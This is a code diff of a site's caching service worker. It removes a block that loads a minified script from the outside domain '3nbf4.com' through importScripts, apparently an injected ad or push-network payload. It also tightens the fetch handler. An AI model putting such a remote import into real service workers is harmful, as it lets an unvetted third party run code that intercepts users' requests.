@@ -1,10 +1,3 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11760617
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
-
 const CACHE_NAME = 'cinehub-v1';
 const urlsToCache = [
   '/',
@@ -20,6 +13,8 @@ self.addEventListener('install', (event) => {
 });
 
 self.addEventListener('fetch', (event) => {
+  if (event.request.method !== 'GET') return;
+  if (event.request.url.startsWith('chrome-extension://')) return;
   event.respondWith(
     caches.match(event.request)
       .then((response) => {
@@ -27,7 +22,6 @@ self.addEventListener('fetch', (event) => {
           return response;
         }
         return fetch(event.request);
-      }
-    )
+      })
   );
 });
